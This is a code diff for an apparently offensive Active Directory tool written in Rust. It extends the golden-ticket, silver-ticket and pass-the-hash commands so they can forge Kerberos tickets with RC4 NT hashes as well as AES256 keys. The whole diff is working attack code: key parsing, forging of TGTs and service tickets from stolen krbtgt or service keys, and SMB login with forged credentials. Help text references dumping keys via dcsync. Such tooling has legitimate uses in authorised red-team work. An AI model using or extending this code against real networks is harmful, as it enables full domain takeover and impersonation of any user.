@@ -132,6 +132,9 @@ struct PthArgs {
     /// Silver mode: target service account AES256 key (64 hex).
     #[arg(long)]
     service_aes256: Option<String>,
+    /// Forge RC4-HMAC (etype 23) — interpret the given key as an NT hash (32 hex; legacy DCs).
+    #[arg(long)]
+    rc4: bool,
     /// Target SPN for the service ticket (default cifs/<host>).
     #[arg(long)]
     spn: Option<String>,
@@ -154,9 +157,12 @@ struct SilverArgs {
     /// Kerberos realm (e.g. CORP.LOCAL).
     #[arg(long)]
     realm: String,
-    /// Service account AES256 key (64 hex) — from `dcsync` of the machine$/service account.
+    /// Service key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
     #[arg(long)]
     service_aes256: String,
+    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the service NT hash (legacy DCs).
+    #[arg(long)]
+    rc4: bool,
     /// Target SPN (e.g. cifs/dc01.corp.local).
     #[arg(long)]
     spn: String,
@@ -185,9 +191,12 @@ struct GoldenArgs {
     /// Kerberos realm (e.g. CORP.LOCAL).
     #[arg(long)]
     realm: String,
-    /// krbtgt AES256 key (64 hex) — from `attack dcsync --target krbtgt`.
+    /// krbtgt key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
     #[arg(long)]
     krbtgt_aes256: String,
+    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the krbtgt NT hash (legacy DCs).
+    #[arg(long)]
+    rc4: bool,
     /// Domain SID (S-1-5-21-a-b-c).
     #[arg(long)]
     domain_sid: String,
@@ -703,6 +712,20 @@ fn parse_nt_hash(s: &str) -> Result<[u8; 16]> {
     Ok(raw.try_into().unwrap())
 }
 
+/// Parse a ticket-forging key: a 16-byte NT hash (32 hex) for RC4, else a 32-byte AES256 key.
+fn parse_forge_key(s: &str, rc4: bool) -> Result<Vec<u8>> {
+    let raw = hex::decode(s.trim()).context("forge key must be hex")?;
+    let want = if rc4 { 16 } else { 32 };
+    anyhow::ensure!(
+        raw.len() == want,
+        "expected a {}-hex {} key, got {} hex",
+        want * 2,
+        if rc4 { "RC4/NT-hash" } else { "AES256" },
+        raw.len() * 2
+    );
+    Ok(raw)
+}
+
 /// SMB login with either a password or an NT hash (pass-the-hash).
 async fn smb_login(
     smb: &mut smb2_client::SmbClient,
@@ -994,11 +1017,7 @@ async fn esc1(a: Esc1Args) -> Result<()> {
 async fn golden(a: GoldenArgs) -> Result<()> {
     use adhammer_kerberos::pac::ForgeIdentity;
 
-    let key = hex::decode(a.krbtgt_aes256.trim()).context("--krbtgt-aes256 must be hex")?;
-    anyhow::ensure!(
-        key.len() == 32,
-        "--krbtgt-aes256 must be a 64-hex AES256 key"
-    );
+    let key = parse_forge_key(&a.krbtgt_aes256, a.rc4)?;
     let subs: Vec<u32> = a
         .domain_sid
         .trim_start_matches("S-1-5-")
@@ -1016,7 +1035,7 @@ async fn golden(a: GoldenArgs) -> Result<()> {
         logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
         logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
     };
-    let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key)?;
+    let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
     println!(
         "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
         a.user, a.realm, a.rid, a.groups
@@ -1045,11 +1064,7 @@ async fn golden(a: GoldenArgs) -> Result<()> {
 async fn silver(a: SilverArgs) -> Result<()> {
     use adhammer_kerberos::pac::ForgeIdentity;
 
-    let key = hex::decode(a.service_aes256.trim()).context("--service-aes256 must be hex")?;
-    anyhow::ensure!(
-        key.len() == 32,
-        "--service-aes256 must be a 64-hex AES256 key"
-    );
+    let key = parse_forge_key(&a.service_aes256, a.rc4)?;
     let subs: Vec<u32> = a
         .domain_sid
         .trim_start_matches("S-1-5-")
@@ -1067,7 +1082,7 @@ async fn silver(a: SilverArgs) -> Result<()> {
         logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
         logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
     };
-    let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &a.spn)?;
+    let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &a.spn, a.rc4)?;
     println!(
         "[+] forged silver ticket: {}@{} for {} (rid {})",
         a.user, a.realm, a.spn, a.rid
@@ -1087,11 +1102,6 @@ async fn pth(a: PthArgs) -> Result<()> {
     use adhammer_kerberos::pac::ForgeIdentity;
     use smb2_client::SmbClient;
 
-    let parse_key = |s: &str, what: &str| -> Result<Vec<u8>> {
-        let k = hex::decode(s.trim()).with_context(|| format!("{what} must be hex"))?;
-        anyhow::ensure!(k.len() == 32, "{what} must be a 64-hex AES256 key");
-        Ok(k)
-    };
     let subs: Vec<u32> = a
         .domain_sid
         .trim_start_matches("S-1-5-")
@@ -1113,17 +1123,17 @@ async fn pth(a: PthArgs) -> Result<()> {
     // Build the service ticket: golden → TGS-REQ; silver → forged directly.
     let st = match (&a.krbtgt_aes256, &a.service_aes256) {
         (Some(k), None) => {
-            let key = parse_key(k, "--krbtgt-aes256")?;
+            let key = parse_forge_key(k, a.rc4)?;
             let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
-            let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key)?;
+            let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
             println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
             let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
             println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
             st
         }
         (None, Some(k)) => {
-            let key = parse_key(k, "--service-aes256")?;
-            let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn)?;
+            let key = parse_forge_key(k, a.rc4)?;
+            let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn, a.rc4)?;
             println!("[+] forged silver ticket for {spn}");
             adhammer_kerberos::silver_service_ticket(&tgt, &spn)
         }
